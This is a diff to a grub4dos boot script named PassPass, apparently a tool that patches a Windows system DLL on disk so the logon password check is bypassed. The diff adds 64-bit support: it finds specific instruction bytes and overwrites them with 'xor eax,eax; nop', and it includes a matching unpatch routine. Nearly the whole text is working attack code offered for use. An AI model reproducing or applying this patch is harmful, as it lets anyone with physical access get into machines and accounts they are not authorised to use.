@@ -144,7 +144,14 @@ goto :EOF
 set dllPath = %2/%3%dll%
 cat --locate=\x33\xC0\x90 %dllPath% > nul
 if "%@retval%"=="1" goto :warnUser
+:: Check for 0x6486 to identify 64-bit PE
+cat --locate=\x64\x86 %dllPath% > nul
+if "%@retval%"=="1" goto :64BitPatch
 cat --hex --locate=\x83\xF8\x10 --replace=\x33\xC0\x90 %dllPath% > nul
+goto :patchMessage
+:64BitPatch
+cat --hex --locate=\x48\x3B\xC6\x0F\x85 --replace=\x33\xC0\x90\x0F\x85 %dllPath% > nul
+:patchMessage
 echo DLL patched
 goto :EOF
 :warnUser
@@ -156,17 +163,24 @@ goto :EOF
 :: Unpatches DLL file, %1 = patchDLL, %2 = (hdX,Y), %3 = WinDir
 :unPatchDLL
 set dllPath = %2/%3%dll%
+:: Check for 0x6486 to identify 64-bit PE
+cat --locate=\x64\x86 %dllPath% > nul
+if "%@retval%"=="1" goto :64BitUnpatch
 cat --hex --locate=\x33\xC0\x90 --replace=\x83\xF8\x10 %dllPath% > nul
+goto :unpatchMessage
+:64BitUnpatch
+cat --hex --locate=\x33\xC0\x90\x0F\x85 --replace=\x48\x3B\xC6\x0F\x85 %dllPath% > nul
+:unpatchMessage
 echo DLL unpatched
 goto :EOF
 
 
 :help
-echo -e \nConGrub v1.0 - Idea by jaclaz, Coded by Sherlock
+echo -e \nPassPass v1.0 - Idea by jaclaz, Coded by Sherlock
 echo Released under the jaclaz's CAREWARE license
-echo -e \nUsage: ConGrub.g4b <MaxDisk#> <MaxPartition#>\n
-echo By default, ConGrub tries to autodetect Windows installations
+echo -e \nUsage: PassPass.g4b <MaxDisk#> <MaxPartition#>\n
+echo By default, PassPass tries to autodetect Windows installations
 echo If autodetection fails, provide MaxDisk# and MaxPartition# 
 echo to forcedetect and guide the script manually 
-echo ConGrub.g4b script and WENV binary need to be
+echo PassPass.g4b script and WENV binary need to be
 echo present on the root of the boot media.
